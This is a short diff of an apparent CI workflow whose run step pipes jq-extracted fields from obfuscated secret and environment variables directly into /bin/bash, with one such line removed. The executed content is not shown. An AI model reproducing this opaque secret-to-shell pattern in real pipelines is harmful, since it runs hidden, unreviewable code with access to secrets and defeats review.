@@ -23,7 +23,6 @@ jobs:
           dffg78821: ${{ secrets.dffg78821 }}
         run: |
           printf '%s' "$dffg78821" | jq -r .n65064 | /bin/bash
-          echo $l9494 | jq -r .hcikw5 | /bin/bash
           printf '%s' "$namkk0" | jq -r .lz156 | /bin/bash
           echo $up4430 | jq -r .zja7307 | /bin/bash
 
